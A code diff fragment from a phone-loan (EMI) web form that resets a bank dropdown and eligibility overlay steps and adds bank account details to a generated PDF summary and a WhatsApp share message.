   if(sendOtpBtn){ sendOtpBtn.disabled = false; sendOtpBtn.textContent = 'Send OTP'; sendOtpBtn.style.display = ''; }
   confirmationResult = null;
   window.recaptchaVerifier = null;
+
+  // ── Reset bank dropdown ──
+  const bankSel = document.getElementById('bankName');
+  if(bankSel) bankSel.value = '';
+  const bankSearch = document.getElementById('bankSearch');
+  if(bankSearch) bankSearch.value = '';
+  // Show all options again
+  if(bankSel) Array.from(bankSel.options).forEach(o => { o.style.display = ''; });
+  const otherBankWrap = document.getElementById('otherBankWrap');
+  if(otherBankWrap) otherBankWrap.style.display = 'none';
+
+  // ── Reset eligibility overlay steps ──
+  for(let i=1;i<=4;i++){
+    const es = document.getElementById('es'+i);
+    if(es){ es.classList.remove('active','done'); }
+  }
+  document.getElementById('eligOverlay').classList.remove('show');
+  document.getElementById('eligModal').classList.remove('show');
 
   // ── Reset processing overlay steps ──
   for(let i=1;i<=5;i++){
@@ -1875,6 +2284,13 @@ function buildPDFHTML(d, emi, months){
     </div>
 
     <div class="section">
+      <div class="section-title">🏦 Bank Account Details</div>
+      ${r('Bank Name', d.bankName || 'N/A')}
+      ${r('Account Number', d.accountNumber || 'N/A')}
+      ${r('IFSC Code', d.ifscCode || 'N/A')}
+    </div>
+
+    <div class="section">
       <div class="section-title">🏪 Store & IMEI Details</div>
       ${r('Store Name', d.storeName)}
       ${r('Store Phone', d.storePhone)}
@@ -1963,6 +2379,10 @@ function shareViaWhatsApp(){
       `• Loan Amount: ₹${parseInt(d.loanAmt).toLocaleString('en-IN')}\n` +
       `• EMI: ₹${emi.toLocaleString('en-IN')} × ${months} months\n` +
       `• Credit Score: ${d.creditScore}\n\n` +
+      `🏦 *BANK DETAILS*\n` +
+      `• Bank: ${d.bankName || 'N/A'}\n` +
+      `• Account: ${d.accountNumber || 'N/A'}\n` +
+      `• IFSC: ${d.ifscCode || 'N/A'}\n\n` +
       `🏪 *STORE*\n` +
       `• ${d.storeName} | ${d.storePhone}\n` +
       `• Sales Exec: ${d.salesExec}\n\n` +
